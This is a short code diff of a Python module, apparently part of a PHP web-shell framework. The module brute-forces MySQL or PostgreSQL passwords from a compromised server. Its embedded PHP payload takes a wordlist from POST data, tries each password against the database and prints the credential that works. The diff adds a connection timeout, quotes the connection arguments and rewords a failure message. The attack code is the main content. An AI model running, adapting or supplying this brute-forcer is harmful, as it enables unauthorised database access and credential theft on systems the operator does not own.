@@ -14,13 +14,13 @@ classname = 'Sql'
  
 class Sql(Module):
     '''Bruteforce sql user
-    :bruteforce.sql mysql|postgres <host> <user> <local_file_list.txt> <start_line>|all
     '''
     
     vectors = VectorList([
             Vector('shell.php', 'brute_sql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"]; 
+ini_set('mysql.connect_timeout',1);
 foreach(split('[\n]+',$w) as $pwd) {
-if(@$m($h, $u, $pwd)){
+if(@$m("$h", "$u", "$pwd")){
 print("+" . $u . ":" . $pwd . "\n");
 break;
 }
@@ -128,7 +128,7 @@ break;
             else:
                 self.mprint("Tried password #%i: (%s:%s) ..." % (endword+start_line, parameters[2], wl[endword-1]))
 
-        self.mprint('[%s] Password of \'%s\' not found. Check dbms connection or try with another username and wordlist' % (self.name, parameters[2]));
+        self.mprint('[%s] Password of \'%s\' not found. Check dbms availability or try with another username and wordlist' % (self.name, parameters[2]));
 
     def __prepare_payload( self, vector, parameters ):
 
